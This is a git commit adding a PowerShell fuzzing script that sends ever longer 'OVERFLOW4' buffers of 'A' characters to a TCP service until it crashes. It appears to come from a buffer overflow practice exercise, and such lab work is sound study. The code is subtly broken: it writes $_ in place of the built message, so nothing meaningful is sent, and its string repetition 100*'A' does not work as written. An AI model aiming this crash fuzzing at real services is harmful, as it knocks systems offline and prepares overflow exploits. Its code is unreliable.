130956bd1d87ebd41f2668a21ef9e545926b419b
Chris <kswidrak95@gmail.com>
2021-08-12 12:09:19 +0200

    Fuzzer
    Script to fuzz the api

---
+++ Fuzzer.ps1
@@ -0,0 +1,23 @@
+﻿$RHOST=""
+$RPORT=""
+$prefix="OVERFLOW4 "
+
+$buffer='A'*100
+
+$ipAddr=[System.Net.IPAddress]::Parse([System.Net.Dns]::GetHostAddresses($RHOST))
+while($true){
+    try{
+        $Socket = New-Object System.Net.Sockets.TCPClient($ipAddr,$RPORT)
+        $Stream = $Socket.GetStream() 
+        $Writer = New-Object System.IO.StreamWriter($Stream)
+        $message=$prefix+$buffer
+        $Writer.WriteLine($_)
+        $Writer.Flush()
+        $buffer=$buffer+100*'A'
+        Start-Sleep -Milliseconds 500
+    }
+    catch{
+        Write-Host "Program crushed at: " $buffer.Length
+        Read-Host "End. (press key)"
+    }
+}
